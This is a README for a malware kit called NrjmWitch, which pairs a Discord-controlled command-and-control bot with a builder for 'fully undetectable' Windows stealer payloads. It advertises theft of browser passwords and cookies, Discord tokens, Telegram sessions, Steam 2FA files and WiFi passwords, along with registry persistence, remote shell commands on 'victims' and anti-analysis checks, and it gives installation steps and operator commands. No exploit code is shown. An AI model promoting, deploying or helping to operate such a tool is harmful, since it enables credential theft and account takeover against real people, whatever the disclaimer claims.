# 🧙‍♀️ NrjmWitch C2 Framework
> **The Ultimate Open Source Command & Control Solution**
> *Advanced, Stealthy, and Zero-Dependency Malware Development Framework*



[![License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Version](https://img.shields.io/badge/Version-2.0.0-green.svg)]()
[![Developer](https://img.shields.io/badge/Developer-0Rafas-purple.svg)](https://github.com/0Rafas)

---

## 📖 Overview

**NrjmWitch** is a state-of-the-art Command & Control (C2) framework designed for researchers and red teamers. It features a powerful **Discord-based Bot** that acts as the controller and a **Polyglot Payload Builder** capable of generating FUD (Fully Undetectable) C++ payloads.

Unlike other tools that rely on Python or heavy DLLs, NrjmWitch compiles **Native C++ (WinAPI)** payloads that have **Zero Dependencies**. This means your payload runs on any Windows machine (7/10/11) without requiring .NET, VC++ Redistributables, or Python installed.

---

## ✨ Features

### 🔌 Zero-Dependency Payload
-   **Pure C++**: Written entirely in C++ using WinAPI and WinInet.
-   **Static Compilation**: Compiles to a single, standalone `.exe` file (< 100KB).
-   **No DLLs Required**: Does not rely on `libstdc++`, `libgcc`, or `MSVCP`.

### 🕵️‍♂️ Advanced Stealer Module (The "Monster")
The payload includes a comprehensive data harvesting module that executes silently upon first run:
-   **🌐 Browsers**: Decrypts and steals Cookies, Passwords, and History from:
    -   Google Chrome
    -   Microsoft Edge
    -   Brave Browser
    -   Opera & Opera GX
    -   Yandex Browser
-   **💬 Messengers**:
    -   **Discord**: Scans LevelDB for Tokens (Bypasses encryption).
    -   **Telegram**: Extracts full `tdata` session for instant login.
-   **🎮 Gaming**:
    -   **Steam**: Steals `ssfn` files (2FA Bypass) and `loginusers.vdf`.
    -   **Minecraft**: Grabs `launcher_profiles.json` (Auth Tokens).
-   **💻 System Intel**:
    -   **WiFi**: Extracts all saved WiFi passwords (Cleartext).
    -   **Snapshot**: Captures a high-res screenshot of the victim's desktop.
    -   **Clipboard**: Steals the current clipboard content.
    -   **Processes**: Lists all running tasks.

### 📡 Command & Control
-   **Real-Time Communication**: Uses Discord API for instant command execution.
-   **Geo-Location**: Auto-detects Victim Country, ISP, and Timezone.
-   **Persistence**: Auto-installs to Registry (`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`) for startup execution.
-   **Task Manager**: View, Kill, and Monitor processes remotely.
-   **Shell Access**: Execute CMD/PowerShell commands directly from Discord.

### 🛠️ Dynamic Builder
-   **Custom Compilation**: The bot compiles a unique payload for *each* user on-the-fly.
-   **Token Injection**: Your Bot Token and ID are injected securely at build time.
-   **Anti-Analysis**: (Optional) Anti-VM and Anti-Debug checks.

---

## 📋 Requirements

Before you begin, ensure you have the following installed on your host machine (Server/PC):

1.  **Node.js**: [Download v16+](https://nodejs.org/) (Required for the Bot).
2.  **MSYS2 (MinGW64)**: [Download](https://www.msys2.org/) (Required for compiling C++ payloads).
    -   *Crucial*: You must install the `mingw-w64-ucrt-x86_64-gcc` package.
    -   Add `C:\msys64\ucrt64\bin` to your System PATH.
3.  **Discord Bot Token**: Create a bot at [Discord Developer Portal](https://discord.com/developers/applications) and enable **MESSAGE CONTENT INTENT**.

---

## 🚀 Installation & Setup

### 1. Clone the Repository
```bash
git clone https://github.com/NrjmWitch/NrjmWitch-Bot.git
cd NrjmWitch-Bot
```

### 2. Install Dependencies
```bash
npm install
```

### 3. Configure the Bot
Rename the `.env.example` file to `.env` and configure your settings:
```ini
# .env file
DISCORD_TOKEN=YOUR_BOT_TOKEN_HERE
OWNER_ID=YOUR_DISCORD_USER_ID
EMBED_COLOR=#A020F0
SUPPORT_URL=https://discord.gg/yourserver
```

### 4. Setup Database
The bot automatically creates the `database.sqlite` file on the first run. No manual SQL setup is needed.

### 5. Run the Bot
```bash
node index.js
```

---

## 🎮 Usage Guide

Once the bot is online, use the following commands in your Discord server:

| Command | Description |
| :--- | :--- |
| `!start` | Initialize your profile and register with the bot. |
| `!buildpayload` | **The Magic Command**. Compiles your custom C++ payload via DM. |
| `!victims` | Displays a dashboard of all infected machines. |
| `!control <IP>` | Opens the control panel for a specific victim. |
| `!cmd <HWID> <command>` | Executes a remote shell command on the victim. |
| `!admin clearvictims` | (Owner Only) Wipes the victim database. |

---

## ⚠️ Disclaimer

**This project is created for educational purposes and security research only.**

The developer (**0Rafas**) is strictly **NOT** responsible for any misuse of this tool. Using this software to attack targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state, and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.

---

## 💜 Credits

<div align="center">

### Developed with ❤️ by **[0Rafas](https://github.com/0Rafas)**

*Special thanks to the Open Source Community for tools like MinGW and Node.js.*

**© 2026 NrjmWitch Project. All Rights Reserved.**

</div>

